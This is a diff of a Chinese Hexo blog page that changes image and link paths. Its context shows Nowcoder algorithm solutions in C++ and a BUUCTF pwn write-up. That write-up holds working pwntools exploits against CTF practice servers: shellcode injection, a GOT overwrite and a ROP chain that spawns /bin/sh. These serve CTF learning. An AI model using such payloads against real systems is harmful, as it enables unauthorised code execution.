@@ -153,7 +153,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/18/08-14-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/18/08-14-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -167,7 +167,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/04/18/08-14-undefined/" class="post-title-link" itemprop="url">牛客网-算法篇</a>
+            <a href="/2021/04/18/08-14-Shuwen/" class="post-title-link" itemprop="url">牛客网-算法篇</a>
         </h2>
 
         <div class="post-meta">
@@ -226,7 +226,7 @@
 <p>他的方法是一个链表从头开始删除，删除的方法也很有意思，就是让他的next指针指向自己，，，，如果没有换的话，每次删除没有问题，，，如果有环的话，，，会发现想要删除的时候，发现next指针已经指向自己了。。。</p>
 </blockquote>
 <p>图示：</p>
-<p><img src="/2021/04/18/08-14-undefined/F616B722C8FF288FE7C88E6AF6A22025" alt="图片说明"></p>
+<p><img src="/2021/04/18/08-14-Shuwen/F616B722C8FF288FE7C88E6AF6A22025" alt="图片说明"></p>
 <p>在第三的的next想要删除的时候，会发现1的next已经指向自己了，，，就判断出有环，，，</p>
 <h4 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span> || head-&gt;next == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;next == head)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* nextNode = head-&gt;next;</span><br><span class="line">        head-&gt;next = head;</span><br><span class="line">        <span class="keyword">return</span> hasCycle(nextNode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <h2 id="NC7-股票（一次交易）"><a href="#NC7-股票（一次交易）" class="headerlink" title="NC7 股票（一次交易）"></a>NC7 股票（一次交易）</h2><blockquote>
@@ -244,7 +244,7 @@
 <h2 id="NC19-子数组的最大累加和的问题"><a href="#NC19-子数组的最大累加和的问题" class="headerlink" title="NC19 子数组的最大累加和的问题"></a>NC19 子数组的最大累加和的问题</h2><blockquote>
 <p>求数组的最大累计和。。。</p>
 <p>方法是动态规划。有点迷，只意会了，</p>
-<p><img src="/2021/04/18/08-14-undefined/image-20210414203852286.png" alt="image-20210414203852286"></p>
+<p><img src="/2021/04/18/08-14-Shuwen/image-20210414203852286.png" alt="image-20210414203852286"></p>
 </blockquote>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * max sum of the subarray</span></span><br><span class="line"><span class="comment">     * @param arr int整型vector the array</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxsumofSubarray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> arr[<span class="number">0</span>];<span class="comment">//确定的情况，直接返回结果</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;arr.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            arr[i]=<span class="built_in">max</span>(arr[i],arr[i<span class="number">-1</span>]+arr[i]);<span class="comment">//求第i位的最大值</span></span><br><span class="line">            ans=<span class="built_in">max</span>(ans,arr[i]);<span class="comment">//求累计最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <h2 id="NC22-合并两个有序的数组"><a href="#NC22-合并两个有序的数组" class="headerlink" title="NC22 合并两个有序的数组"></a>NC22 合并两个有序的数组</h2><blockquote>
@@ -343,17 +343,17 @@
 <h2 id="NC66-两个链表的第一个公共结点"><a href="#NC66-两个链表的第一个公共结点" class="headerlink" title="NC66 两个链表的第一个公共结点"></a>NC66 两个链表的第一个公共结点</h2><blockquote>
 <ol>
 <li><p>说的是公共结点而不是相同元素的结点，所以如图所示：</p>
-<p><img src="/2021/04/18/08-14-undefined/image-20210414211616825.png" alt="image-20210414211616825"></p>
+<p><img src="/2021/04/18/08-14-Shuwen/image-20210414211616825.png" alt="image-20210414211616825"></p>
 <p>2.a的长度不一定等于b的长度，为了让两个指针同步走，又因为a+b=b+a</p>
 <p>故前面增加另一个链表，如下图所示</p>
-<p><img src="/2021/04/18/08-14-undefined/image-20210414211726549.png" alt="image-20210414211726549"></p>
+<p><img src="/2021/04/18/08-14-Shuwen/image-20210414211726549.png" alt="image-20210414211726549"></p>
 </li>
 </ol>
 </blockquote>
 <h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct ListNode &#123;</span></span><br><span class="line"><span class="comment">	int val;</span></span><br><span class="line"><span class="comment">	struct ListNode *next;</span></span><br><span class="line"><span class="comment">	ListNode(int x) :</span></span><br><span class="line"><span class="comment">			val(x), next(NULL) &#123;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">FindFirstCommonNode</span><span class="params">( ListNode* pHead1, ListNode* pHead2)</span> </span>&#123;</span><br><span class="line">        ListNode* ta=pHead1;</span><br><span class="line">        ListNode* tb=pHead2;</span><br><span class="line">        <span class="keyword">while</span>(ta!=tb)&#123;<span class="comment">//公共结点</span></span><br><span class="line">            ta=ta?ta-&gt;next:pHead2;<span class="comment">//pHead1+pHead2</span></span><br><span class="line">            tb=tb?tb-&gt;next:pHead1;<span class="comment">//pHead1+pHead1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ta;<span class="comment">//直接返回即可，一定有公共结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <h2 id="NC68-跳台阶"><a href="#NC68-跳台阶" class="headerlink" title="NC68 跳台阶"></a>NC68 跳台阶</h2><blockquote>
 <p>有递归和循环（动态规划）两种解法，我写的是递归。</p>
-<p>递归式：<img src="/2021/04/18/08-14-undefined/image-20210414170335614.png" alt="image-20210414170335614"></p>
+<p>递归式：<img src="/2021/04/18/08-14-Shuwen/image-20210414170335614.png" alt="image-20210414170335614"></p>
 </blockquote>
 <h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><blockquote>
 <p>将过程的情况记录在dp数组中。</p>
@@ -383,7 +383,7 @@
 <h3 id="my-exp-1"><a href="#my-exp-1" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int MoreThanHalfNum_Solution(vector&lt;int&gt; numbers) &#123;</span><br><span class="line">        int arr[10]&#x3D;&#123;0,0,0,0,0,0,0,0,0,0&#125;;</span><br><span class="line">        for(int i&#x3D;0;i&lt;numbers.size();i++)&#123;</span><br><span class="line">            arr[numbers[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i&#x3D;0;i&lt;10;i++)&#123;</span><br><span class="line">            if(arr[i]&gt;numbers.size()&#x2F;2)&#123;</span><br><span class="line">                return i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <h2 id="NC-76-用两个栈实现队列"><a href="#NC-76-用两个栈实现队列" class="headerlink" title="NC 76 用两个栈实现队列"></a>NC 76 用两个栈实现队列</h2><blockquote>
 <p>简单，，，图示如下：</p>
-<p><img src="/2021/04/18/08-14-undefined/image-20210412140342164.png" alt="image-20210412140342164"></p>
+<p><img src="/2021/04/18/08-14-Shuwen/image-20210412140342164.png" alt="image-20210412140342164"></p>
 </blockquote>
 <h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>思路：</p>
 <ol>
@@ -474,7 +474,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/29/22-03-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/29/22-03-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -488,7 +488,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/29/22-03-undefined/" class="post-title-link" itemprop="url">buu每日一题（3）</a>
+            <a href="/2021/03/29/22-03-Shuwen/" class="post-title-link" itemprop="url">buu每日一题（3）</a>
         </h2>
 
         <div class="post-meta">
@@ -542,7 +542,7 @@
 <h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
 <p>关闭了输出流和错误流，然后直接给了shell，但是没有输出。</p>
 </blockquote>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210430210044168.png" alt="image-20210430210044168"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210430210044168.png" alt="image-20210430210044168"></p>
 <p>方法：</p>
 <h3 id="stdout重定向"><a href="#stdout重定向" class="headerlink" title="stdout重定向"></a>stdout重定向</h3><p>简单来说，既然stdout的文件描述符不可用，可以对stdout重定向，将文件描述符 stdout（1）重定向到可用文件描述符 stdin（0）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
@@ -561,7 +561,7 @@
 </li>
 </ul>
 </blockquote>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501162717088.png" alt="image-20210501162717088"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501162717088.png" alt="image-20210501162717088"></p>
 <h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><blockquote>
 <p>自己不知道哪里错了，，，直接用师傅的<a href="https://www.cnblogs.com/luoleqi/p/13409781.html" target="_blank" rel="noopener">exp</a></p>
 </blockquote>
@@ -570,8 +570,8 @@
 <p>最简单的ret2shellcode题，把shellcode发过去就行。。。</p>
 </blockquote>
 <h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>唯一的难点应该在于main函数不能反汇编，得看汇编。</p>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501164740595.png" alt="image-20210501164740595"></p>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501164752604.png" alt="image-20210501164752604"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501164740595.png" alt="image-20210501164740595"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501164752604.png" alt="image-20210501164752604"></p>
 <p>vuln函数就是输入再打印。</p>
 <p>所以，程序流程就是输入数据，并且会直接改数据。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29061</span>)</span><br><span class="line">elf = ELF(<span class="string">'./PicoCTF_2018_shellcode'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -580,13 +580,13 @@
 <p>而且给了后门函数，直接修改puts的got表位win的地址即可。</p>
 <p>注意一点：发送数据应该发送的是整数，也就是hex()，而不是p32()，它是字符。</p>
 </blockquote>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210419145953699.png" alt="image-20210419145953699"></p>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210419150030225.png" alt="image-20210419150030225"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210419145953699.png" alt="image-20210419145953699"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210419150030225.png" alt="image-20210419150030225"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25946</span>)</span><br><span class="line">elf = ELF(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">win = elf.symbols[<span class="string">'win'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"value?"</span>)</span><br><span class="line">p.sendline(hex(puts_got))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"like"</span>)</span><br><span class="line">p.sendline(hex(win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a>mrctf2020_easy_equation</h2><blockquote>
 <p>一道格式化字符串，，，，不知道为什么用pwntools工具不好使，，，</p>
 </blockquote>
-<h3 id="程序流程-3"><a href="#程序流程-3" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501231211604.png" alt="image-20210501231211604"></p>
+<h3 id="程序流程-3"><a href="#程序流程-3" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501231211604.png" alt="image-20210501231211604"></p>
 <p>输入字符串，格式化字符串</p>
 <p>一个判断，满足判断即可获得shell</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> judge <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">	<span class="keyword">if</span>( <span class="number">11</span> * judge * judge + <span class="number">17</span> * judge * judge * judge * judge - <span class="number">13</span> * judge * judge * judge - <span class="number">7</span> * judge == <span class="number">198</span>):</span><br><span class="line">		<span class="keyword">print</span> judge</span><br></pre></td></tr></table></figure>
@@ -611,7 +611,7 @@
 <p>静态文件，用ropchain就行，类似于<a href="https://blog.csdn.net/qq_43935969/article/details/104444648?spm=1001.2014.3001.5501" target="_blank" rel="noopener">这道题</a></p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file PicoCTF_2018_can-you-gets-me </span><br><span class="line">PicoCTF_2018_can-you-gets-me: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU&#x2F;Linux), statically linked, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped</span><br><span class="line"></span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec PicoCTF_2018_can-you-gets-me</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;PicoCTF_2018_can-you-gets-me&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506151027760.png" alt="image-20210506151027760"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506151027760.png" alt="image-20210506151027760"></p>
 <p>栈溢出，18个字节</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary PicoCTF_2018_can-you-gets-me --ropchain</span><br></pre></td></tr></table></figure>
 <h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process("./PicoCTF_2018_can-you-gets-me")</span></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26005</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x18</span> + <span class="number">4</span>)+p</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -622,7 +622,7 @@
 <p>有一个循环，格式化字符串漏洞，多次利用</p>
 <p>程序中调用了system函数</p>
 </blockquote>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506152600364.png" alt="image-20210506152600364"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506152600364.png" alt="image-20210506152600364"></p>
 <h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
 <li>利用格式化字符串修改printf的got为system函数的plt表</li>
 <li>发送‘/bin/sh’即可。</li>
@@ -632,21 +632,21 @@
 <p>最简单的栈溢出</p>
 </blockquote>
 <p>偏移量为0x110</p>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506154310332.png" alt="image-20210506154310332"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506154310332.png" alt="image-20210506154310332"></p>
 <h3 id="后门函数：-bin-cat"><a href="#后门函数：-bin-cat" class="headerlink" title="后门函数：/bin/cat"></a>后门函数：/bin/cat</h3><p>执行该函数能直接打印flag</p>
-<p><img src="/2021/03/29/22-03-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506154404324.png" alt="image-20210506154404324"></p>
+<p><img src="/2021/03/29/22-03-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506154404324.png" alt="image-20210506154404324"></p>
